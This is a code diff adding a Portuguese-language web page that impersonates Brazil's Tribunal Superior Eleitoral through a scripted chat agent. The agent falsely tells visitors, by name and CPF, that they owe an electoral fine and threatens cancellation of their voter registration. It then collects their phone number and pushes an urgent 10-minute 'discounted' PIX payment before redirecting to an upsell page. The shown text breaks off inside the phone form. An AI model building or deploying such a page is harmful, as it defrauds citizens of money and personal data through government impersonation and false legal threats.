@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "ttuhjmpt6a");
+    </script>
+    <!-- Google Ads -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18302482370"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){ dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'AW-18302482370');
+    </script>
+    <!-- Pixels Dynamic Loader -->
+    <script src="/static/js/pixel-loader.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat - Justiça Eleitoral</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts - Sora -->
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Sora', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+<style>
+    :root {
+        --receita-blue: #1B3A6B;
+        --receita-success: #28a745;
+        --receita-danger: #dc3545;
+    }
+
+    @keyframes slideDown {
+        0% { 
+            transform: translateY(-100%);
+            opacity: 0;
+        }
+        100% { 
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+    
+    @keyframes fadeIn {
+        0% { opacity: 0; }
+        100% { opacity: 1; }
+    }
+
+    body {
+        font-family: 'Sora', sans-serif;
+        background-color: #fff;
+        color: #333;
+        line-height: 1.6;
+    }
+
+    .chat-container {
+        overflow-y: auto;
+        padding: 10px 20px;
+        scroll-behavior: smooth;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .chat-container::-webkit-scrollbar {
+        width: 6px;
+    }
+
+    .chat-container::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+
+    .chat-container::-webkit-scrollbar-thumb {
+        background: #c9c9c9;
+        border-radius: 10px;
+    }
+
+    .message-bubble {
+        margin-bottom: 16px;
+        max-width: 75%;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .incoming-message {
+        align-self: flex-start;
+        margin-right: auto;
+        padding-left: 0px;
+        margin-left: -10px;
+    }
+
+    .outgoing-message {
+        align-self: flex-end;
+        margin-left: auto;
+        align-items: flex-end;
+        padding-right: 0px;
+        margin-right: -10px;
+    }
+
+    .message-content {
+        padding: 14px 18px;
+        border-radius: 18px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        margin-top: 4px;
+        position: relative;
+        line-height: 1.5;
+    }
+
+    .incoming-message .message-content {
+        background-color: #1B3A6B;
+        border-top-left-radius: 2px;
+        text-align: left;
+        color: white;
+        min-width: 200px;
+    }
+
+    .outgoing-message .message-content {
+        background-color: #d4d4d4;
+        border-top-right-radius: 2px;
+        text-align: right;
+        border-right: 2px solid #999;
+    }
+
+    .chat-avatar {
+        width: 62px;
+        height: 62px;
+        border-radius: 50%;
+        object-fit: cover;
+        object-position: center 15%;
+        border: 2px solid var(--receita-blue);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+
+    .status-indicator {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        background-color: var(--receita-success);
+        border: 2px solid white;
+    }
+
+    .chat-options {
+        margin-top: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        padding-left: 0px;
+        margin-left: -10px;
+        max-width: 75%;
+    }
+
+    .option-button {
+        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+        border: 1px solid #d0d0d0;
+        border-radius: 2px;
+        padding: 16px 20px;
+        text-align: left;
+        transition: all 0.2s ease;
+        cursor: pointer;
+        font-weight: 500;
+        box-shadow: 
+            0 4px 8px rgba(0,0,0,0.1),
+            inset 0 1px 0 rgba(255,255,255,0.5),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+        font-size: 1.05rem;
+        margin-bottom: 12px;
+        color: #333;
+    }
+
+    .option-button:hover {
+        background: linear-gradient(145deg, #f0f0f0, #ffffff);
+        border-color: var(--receita-blue);
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 16px rgba(0,0,0,0.15),
+            inset 0 1px 0 rgba(255,255,255,0.7),
+            inset 0 -1px 0 rgba(0,0,0,0.05);
+    }
+
+    .option-button i {
+        font-size: 1.2rem;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+
+    .avatar-container {
+        position: relative;
+        margin-right: 15px;
+        flex-shrink: 0;
+    }
+
+    .typing-animation {
+        display: flex;
+        align-items: center;
+        column-gap: 5px;
+        height: 15px;
+    }
+
+    .typing-animation .dot {
+        display: block;
+        width: 7px;
+        height: 7px;
+        opacity: 0.8;
+        border-radius: 50%;
+        background-color: white;
+        animation: loadingFade 1s infinite;
+    }
+
+    .typing-animation .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+
+    .typing-animation .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+
+    .typing-animation .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    @keyframes loadingFade {
+        0% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+        100% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+    }
+
+    .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 20px;
+        background-color: #ffffff;
+        border-bottom: 1px solid #e0e0e0;
+        box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+        height: 75px;
+    }
+    .header-logos {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        flex-shrink: 0;
+    }
+    .header-logos .divider {
+        width: 1px;
+        height: 45px;
+        background-color: #d0d0d0;
+    }
+    .header-logos .logo {
+        height: 55px;
+        width: auto;
+    }
+    .header-logos .govbr-logo {
+        height: 55px;
+        width: auto;
+    }
+    .header-title-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        flex: 1;
+        text-align: center;
+        padding: 0 15px;
+    }
+    .header-title-section h1 {
+        font-size: 14px;
+        font-weight: 700;
+        color: #1B3A6B;
+        margin: 0;
+        letter-spacing: 0.5px;
+    }
+    .header-icons {
+        display: flex;
+        gap: 15px;
+        flex-shrink: 0;
+    }
+    .header-icon {
+        font-size: 18px;
+        color: #1B3A6B;
+    }
+
+    @media (max-width: 576px) {
+        .message-bubble {
+            max-width: 85%;
+        }
+
+        .chat-container {
+            height: 55vh;
+            padding: 15px;
+        }
+
+        .header {
+            padding: 6px 8px;
+        }
+        .header-logos .logo {
+            height: 38px;
+            width: auto;
+        }
+        .header-logos .govbr-logo {
+            height: 38px;
+        }
+        .header-logos .divider {
+            height: 30px;
+        }
+        .header-logos {
+            gap: 8px;
+        }
+        .header-title-section h1 {
+            font-size: 11px;
+        }
+        .header-title-section {
+            padding: 0 8px;
+        }
+        .header-icons {
+            gap: 8px;
+        }
+        .header-icon {
+            font-size: 16px;
+        }
+    }
+</style>
+
+<body>
+    <!-- TSE Header -->
+    <div class="header">
+        <div class="header-logos">
+            <img src="/static/images/logo-portal.webp" alt="Gov.br" class="govbr-logo">
+            <div class="divider"></div>
+            <img alt="Logo TSE" class="logo" src="/static/images/logo-sistema.png"/>
+        </div>
+        <div class="header-title-section">
+            <h1>Justiça Eleitoral do Brasil</h1>
+        </div>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+    <div class="py-3" style="background-color: #1B3A6B; border-top: 2px solid #C4A84D;">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-white text-sm font-semibold">TRIBUNAL SUPERIOR ELEITORAL - JUSTIÇA ELEITORAL DO BRASIL</p>
+        </div>
+    </div>
+    <!-- Attendant Info -->
+    <div class="bg-gray-100 text-gray-800 px-4 md:px-8 py-3">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex items-center w-full">
+                <div class="avatar-container mr-4">
+                    <img src="/static/images/consultor-avatar.png" 
+                         class="chat-avatar" alt="Lucia Helena">
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="flex-1">
+                    <h2 class="header-title text-gray-800 text-lg font-semibold">Lucia Helena</h2>
+                    <p class="header-subtitle text-gray-600 text-sm">Analista Judiciária - Justiça Eleitoral</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+            <!-- Chat Body -->
+            <div class="overflow-hidden position-relative">
+                <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+                    <!-- Messages will be inserted here by JavaScript -->
+                </div>
+            </div>
+        </div>
+    </main>
+
+<script>
+// Get customer data from localStorage (saved when accessing via CPF slug)
+const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+
+// Function to properly capitalize names
+function capitalizeNames(name) {
+    if (!name) return 'Nome não informado';
+    return name.toLowerCase().split(' ').map(word => 
+        word.charAt(0).toUpperCase() + word.slice(1)
+    ).join(' ');
+}
+
+const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Eleitor(a)';
+const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
+const cpf = customerData.cpf || 'CPF não informado';
+
+// Chat sequence with electoral irregularity notification
+const chatSequence = [
+    {
+        message: `Olá ${firstName}, aqui é a Lucia Helena, Analista Judiciária do Tribunal Superior Eleitoral.`,
+        delay: 3000
+    },
+    {
+        message: `Trabalho na área de regularização eleitoral. Foi identificada uma pendência de multa eleitoral no valor de R$ 419,55 vinculada ao seu CPF ${cpf}, referente à ausência nas eleições de 2020, 2022 e 2024 sem justificativa.`,
+        delay: 12000,
+        requestPhone: true
+    },
+    {
+        message: `Informo que seu título de eleitor consta como IRREGULAR no sistema da Justiça Eleitoral. Caso não regularize, você ficará impedido(a) de obter passaporte, tomar posse em cargo público, realizar financiamentos em bancos públicos e emitir certidões.`,
+        delay: 11000
+    },
+    {
+        message: `Se a multa eleitoral não for quitada, será aplicado o cancelamento definitivo do título de eleitor e uma multa agravada no valor de R$ 985,00, conforme Art. 7º do Código Eleitoral (Lei nº 4.737/65).`,
+        delay: 10000
+    },
+    {
+        message: `A Justiça Eleitoral disponibiliza um desconto de 81% para quitação imediata, reduzindo a multa de R$ 419,55 para apenas R$ 79,34. ${firstName}, deseja quitar com desconto ou autoriza o cancelamento do título de eleitor?`,
+        delay: 10000,
+        showOptions: 'debtOptions'
+    }
+];
+
+// Chat container
+const chatContainer = document.getElementById('chatContainer');
+
+// Add message to chat
+let currentPlayingAudio = null;
+
+function playAudio(audioSrc) {
+    if (currentPlayingAudio) {
+        currentPlayingAudio.pause();
+        currentPlayingAudio.currentTime = 0;
+    }
+    const audio = new Audio(audioSrc);
+    currentPlayingAudio = audio;
+    audio.play().catch(e => console.log('Autoplay prevented/pending interaction:', e));
+    return audio;
+}
+
+function addMessage(text, isIncoming = true, scrollToBottom = true, audioSrc = null) {
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
+    
+    let audioButtonHtml = '';
+    if (audioSrc) {
+        audioButtonHtml = `
+            <div style="margin-top: 6px; display: flex; align-items: center; gap: 8px; font-size: 0.85rem; opacity: 0.9; cursor: pointer;" onclick="playAudio('${audioSrc}')">
+                <i class="fas fa-volume-up" style="color: #FFD700;"></i>
+                <span style="text-decoration: underline; font-size: 12px;">Ouvir áudio</span>
+            </div>
+        `;
+    }
+
+    messageDiv.innerHTML = `
+        <div class="message-content">
+            ${text.replace(/\n/g, '<br>')}
+            ${audioButtonHtml}
+        </div>
+    `;
+    
+    chatContainer.appendChild(messageDiv);
+    
+    if (audioSrc) {
+        playAudio(audioSrc);
+    }
+
+    if (scrollToBottom) {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+// Show typing indicator
+function showTyping(duration = 3000) {
+    return new Promise(resolve => {
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+        typingDiv.style.paddingLeft = '0px';
+        typingDiv.style.marginLeft = '-10px';
+        typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: #1B3A6B; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+
+        chatContainer.appendChild(typingDiv);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+
+        setTimeout(() => {
+            if (typingDiv.parentNode) {
+                typingDiv.parentNode.removeChild(typingDiv);
+            }
+            resolve();
+        }, duration);
+    });
+}
+
+// Show options
+function showOptions(optionsId) {
+    let optionsHtml = '';
+
+    if (optionsId === 'debtOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora', 'redirectToPayment')">
+                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
+                    Vou quitar a multa agora
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o cancelamento do título', 'confirmBlock')">
+                    <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
+                    Autorizo o cancelamento do título
+                </button>
+            </div>
+        `;
+    }
+
+    if (optionsHtml) {
+        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+// Handle option click
+function handleOptionClick(button, responseText, nextAction) {
+    // Add user response to chat
+    addMessage(responseText, false, true);
+
+    // Remove the options container
+    const optionsContainer = button.closest('.chat-options');
+    if (optionsContainer) {
+        optionsContainer.remove();
+    }
+
+    // Show typing and continue conversation
+    setTimeout(async () => {
+        if (nextAction === 'redirectToPayment') {
+            await showTyping(4000);
+            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade.`, true, true);
+            
+            await showTyping(5000);
+            addMessage('Segundo as normas da Justiça Eleitoral, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa agravada no valor de R$985,00 e o título de eleitor será cancelado definitivamente.', true, true);
+            
+            // Show payment button
+            setTimeout(() => {
+                showPaymentButton();
+            }, 2000);
+        } else if (nextAction === 'confirmBlock') {
+            await showTyping(8000);
+            addMessage('Entendido. Vou iniciar o processo de cancelamento do seu título de eleitor conforme os procedimentos da Justiça Eleitoral. O cancelamento será efetivado em breve. Obrigada pela atenção.', true, true);
+        }
+    }, 1000);
+}
+
+// Show payment button
+function showPaymentButton() {
+    const buttonHtml = `
+        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <button class="payment-button" onclick="openPixModal()" style="
+                background: #28a745;
+                border: none;
+                border-radius: 2px;
+                padding: 16px 24px;
+                color: white;
+                font-weight: 600;
+                font-size: 1.1rem;
+                cursor: pointer;
+                width: 100%;
+                text-align: center;
+                transition: all 0.3s ease;
+                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
+               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
+                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
+                Realizar pagamento
+            </button>
+        </div>
+    `;
+    
+    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+}
+
+// PIX Modal functionality
+async function openPixModal() {
+    // Show loading modal first
+    showLoadingModal();
+    
+    try {
+        // Get ALL customer data from localStorage
+        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+        const clientData = {
+            telefone: customerData.telefone || '',
+            nome: customerData.nome || '',
+            cpf: customerData.cpf || ''
+        };
+        
+        
+        const response = await fetch('/generate-pix', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(clientData)
+        });
+
+        const data = await response.json();
+
+        if (data.success && (data.pixCode || data.pix_code)) {
+            try {
+                if (window.firePixelEvent) {
+                    window.firePixelEvent('InitiateCheckout', { value: 68.92, currency: 'BRL' });
+                }
+                gtag('event', 'conversion', {
+                    send_to: 'AW-18302482370/L4AGCI-A3c0cEMLvppdE',
+                    value: 79.34,
+                    currency: 'BRL',
+                    transaction_id: data.transactionId || data.orderId || ''
+                });
+            } catch(e) { console.error('gtag error', e); }
+            // Replace loading modal with PIX data
+            showPixModal(data);
+        } else {
+            closePixModal();
+            alert('Erro ao gerar PIX. Tente novamente.');
+        }
+    } catch (error) {
+        console.error('Erro:', error);
+        closePixModal();
+        alert('Erro ao gerar PIX. Tente novamente.');
+    }
+}
+
+function showLoadingModal() {
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto;">
+            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                <div style="text-align: center;">
+                    <div class="spinner" style="
+                        width: 60px;
+                        height: 60px;
+                        border: 6px solid #f3f3f3;
+                        border-top: 6px solid #1B3A6B;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 30px auto;
+                    "></div>
+                    <h2 style="color: #1B3A6B; font-weight: 600; margin-bottom: 15px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                    <p style="color: #666; font-size: 1rem;">Gerando GRU Eleitoral, por favor aguarde...</p>
+                </div>
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+}
+
+function showPixModal(data) {
+    // Remove loading modal and show PIX modal
+    const existingModal = document.getElementById('pixModal');
+    if (existingModal) {
+        existingModal.remove();
+    }
+    
+    const pixCodeText = data.pixCode || data.pix_code || '';
+    const qrCodeData = pixCodeText ? `/generate-qrcode?data=${encodeURIComponent(pixCodeText)}` : '';
+    
+    // Start payment monitoring
+    const gatewayId = data.gateway_id || data.transaction_id || data.orderId || data.order_id;
+    window._pixTransactionId = gatewayId;
+    console.log('🔍 Dados PIX recebidos:', data);
+    console.log('🆔 Gateway ID identificado:', gatewayId);
+    
+    if (gatewayId) {
+        console.log('✅ Iniciando monitoramento de pagamento para:', gatewayId);
+        startPaymentMonitoring(gatewayId);
+        
+        // Show manual confirmation popup after 20 seconds
+        console.log('⏰ Configurando popup de confirmação para aparecer em 20 segundos...');
+        setTimeout(() => {
+            console.log('⏰ 20 segundos passaram, chamando showManualPaymentConfirmation...');
+            showManualPaymentConfirmation(gatewayId);
+        }, 20000);
+    } else {
+        console.error('❌ Nenhum gateway_id encontrado nos dados:', data);
+    }
+    
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto; animation: fadeIn 1s ease-out;">
+            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; animation: slideDown 1s ease-out; transform: translateY(0);">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <div class="spinner" style="
+                        width: 40px;
+                        height: 40px;
+                        border: 4px solid #f3f3f3;
+                        border-top: 4px solid #1B3A6B;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 15px auto;
+                    "></div>
+                    <h2 style="color: #1B3A6B; font-weight: 600; margin-bottom: 10px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                    <p style="color: #666; font-size: 0.9rem;">Estamos aguardando o pagamento</p>
+                </div>
+
+                <div style="text-align: center; margin: 20px 0;">
+                    <div style="display: inline-block; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                        <img src="${qrCodeData}" alt="QR Code PIX" style="width: 150px; height: 150px;">
+                    </div>
+                </div>
+
+                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #1B3A6B;">Código PIX (Copia e Cola) - Multa Eleitoral: R$ 79,34:</label>
+                    <div style="margin-bottom: 10px;">
+                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${data.pixCode || data.pix_code}</textarea>
+                        <input type="hidden" id="pixCodeInputReal" value="${data.pixCode || data.pix_code}">
+                    </div>
+                    <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #1B3A6B; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                        <i class="fas fa-copy"></i> Copiar código PIX completo
+                    </button>
+                </div>
+
+                <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
+                    <h4 style="color: #856404; margin-bottom: 15px; font-size: 1rem; font-weight: 600;">
+                        <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+                        Como pagar com PIX Copia e Cola:
+                    </h4>
+                    <div style="color: #856404; font-size: 0.9rem; line-height: 1.5;">
+                        <p style="margin-bottom: 8px;"><strong>1.</strong> Copie o código PIX clicando no botão acima</p>
+                        <p style="margin-bottom: 8px;"><strong>2.</strong> Abra o aplicativo do seu banco</p>
+                        <p style="margin-bottom: 8px;"><strong>3.</strong> Procure pela opção "PIX" e depois "Copia e Cola"</p>
+                        <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de R$ 79,34</p>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e8f4fd; border-radius: 8px; border-left: 4px solid #1B3A6B;">
+                    <p style="color: #1B3A6B; font-weight: 600; margin-bottom: 10px;">
+                        <i class="fas fa-clock" style="margin-right: 8px;"></i>
+                        Tempo para pagamento: 10 minutos
+                    </p>
+                    <p style="color: #666; font-size: 0.9rem;">Após o pagamento, retorne imediatamente a esta página para confirmação.</p>
+                </div>
+
+                <div style="text-align: center; margin-top: 20px;">
+                    <button onclick="closePixModal()" style="padding: 12px 24px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                        Fechar
+                    </button>
+                </div>
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+}
+
+function copyPixCode() {
+    // Get the real PIX code from hidden input
+    const realPixInput = document.getElementById('pixCodeInputReal');
+    const realPixCode = realPixInput.value;
+
+    (function(txId) {
+        if (!txId) return;
+        try {
+            fetch('/api/pix-copied', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ transactionId: txId })
+            }).catch(function() {});
+        } catch(e) {}
+    })(window._pixTransactionId);
+
+    try {
+        // Copy the real PIX code to clipboard
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(realPixCode);
+        } else {
+            // Fallback for older browsers
+            const textArea = document.createElement('textarea');
+            textArea.value = realPixCode;
+            document.body.appendChild(textArea);
+            textArea.select();
+            textArea.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
+        
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+        button.style.background = '#28a745';
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.style.background = '#1B3A6B';
+        }, 3000);
+    } catch (err) {
+        console.error('Erro ao copiar:', err);
+        alert('Erro ao copiar código. Tente selecionar manualmente.');
+    }
+}
+
+function closePixModal() {
+    const modal = document.getElementById('pixModal');
+    if (modal) {
+        modal.remove();
+    }
+    
+    // Stop payment monitoring
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+        window.paymentMonitorInterval = null;
+    }
+}
+
+// Payment monitoring function
+function startPaymentMonitoring(gatewayId) {
+    console.log(`🚀 INICIANDO MONITORAMENTO AUTOMÁTICO - Gateway ID: ${gatewayId}`);
+    console.log(`📍 URL de verificação: /check-payment/${gatewayId}`);
+    
+    // Clear any existing interval
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+        console.log('🔄 Limpando monitoramento anterior');
+    }
+    
+    // VERIFICA STATUS A CADA 1 SEGUNDO - REDIRECIONAMENTO INSTANTÂNEO
+    window.paymentMonitorInterval = setInterval(async () => {
+        try {
+            const statusUrl = `/check-payment/${gatewayId}`;
+            console.log(`🔍 Verificando pagamento... URL: ${statusUrl}`);
+            
+            const response = await fetch(statusUrl, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+            
+            if (!response.ok) {
+                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+            
+            const statusData = await response.json();
+            console.log('📊 RESPOSTA DO BACKEND:', JSON.stringify(statusData, null, 2));
+            
+            // VERIFICA SE PAGAMENTO FOI APROVADO
+            if (statusData.status === 'paid' || statusData.status === 'approved' || statusData.status === 'completed') {
+                console.log('🎉 🎉 🎉 PAGAMENTO CONFIRMADO! REDIRECIONANDO AGORA! 🎉 🎉 🎉');
+                try {
+                    if (window.firePixelEvent) {
+                        window.firePixelEvent('Purchase', { value: 68.92, currency: 'BRL' });
+                    }
+                } catch(e) {}
+                
+                // Para o monitoramento imediatamente
+                clearInterval(window.paymentMonitorInterval);
+                window.paymentMonitorInterval = null;
+                
+                // Remove modal se existir
+                const modal = document.getElementById('pixModal');
+                if (modal) {
+                    modal.remove();
+                }
+                
+                // REDIRECIONAMENTO INSTANTÂNEO PARA /MULTA
+                console.log('↗️ Redirecionando para /negociacao...');
+                window.location.href = '/upsell1';
+                return;
+                
+            } else if (statusData.status === 'expired' || statusData.status === 'cancelled' || statusData.status === 'failed') {
+                console.log(`❌ Transação ${statusData.status} - parando monitoramento`);
+                clearInterval(window.paymentMonitorInterval);
+                window.paymentMonitorInterval = null;
+                return;
+            } else {
+                console.log(`⏳ Status atual: ${statusData.status} - continuando monitoramento...`);
+            }
+            
+        } catch (error) {
+            console.error('❌ ERRO NO MONITORAMENTO:', error);
+        }
+    }, 1000); // VERIFICA A CADA 1 SEGUNDO EXATO
+    
+    console.log('✅ Monitoramento ativo - verificando a cada 1 segundo até pagamento ser aprovado');
+    
+    
+    // Timeout after 20 minutes (PIX expiration)
+    setTimeout(() => {
+        if (window.paymentMonitorInterval) {
+            clearInterval(window.paymentMonitorInterval);
+            window.paymentMonitorInterval = null;
+        }
+    }, 20 * 60 * 1000); // 20 minutes
+}
+
+// Initialize chat
+async function initializeChat() {
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    for (let i = 0; i < chatSequence.length; i++) {
+        const message = chatSequence[i];
+        
+        // Show typing
+        await showTyping(message.delay);
+        
+        // Add message with audio
+        addMessage(message.message, true, true, `/static/audio/audio${i + 1}.mp3`);
+        
+        // Request phone after second message
+        if (message.requestPhone) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            await showTyping(3000);
+            addMessage(`Informo que seu CPF será bloqueado a qualquer momento! Para regular o débito, preciso que confirme seu número de telefone abaixo:`, true, true);
+            
+            // Show phone input form
+            setTimeout(() => {
+                showPhoneInput();
+            }, 1000);
+            
+            // Wait for phone confirmation before continuing
+            await waitForPhoneConfirmation();
+        }
+        
+        // Show options if specified
+        if (message.showOptions) {
+            setTimeout(() => {
+                showOptions(message.showOptions);
+            }, 1500);
+        }
+    }
+}
+
+// Global variable to control phone confirmation
+let phoneConfirmationResolve = null;
+
+// Show phone input form
+function showPhoneInput() {
+    const phoneInputHtml = `
+        <div class="phone-input-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6;">
+                <label for="phoneInput" style="display: block; margin-bottom: 10px; font-weight: 600; color: #1B3A6B;">
+                    Digite seu número de telefone (DDD + número):
+                </label>
+                <input 
+                    type="tel" 
+                    id="phoneInput" 
+                    placeholder="Ex: 11987654321"
+                    maxlength="11"
+                    style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #1B3A6B;
+                        border-radius: 4px;
+                        font-size: 1rem;
+                        margin-bottom: 15px;
+                        text-align: center;
+                        font-weight: 600;
+                    "
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                />
+                <button 
+                    onclick="confirmPhone()" 
+                    style="
+                        background: #1B3A6B;
+                        color: white;
+                        border: none;
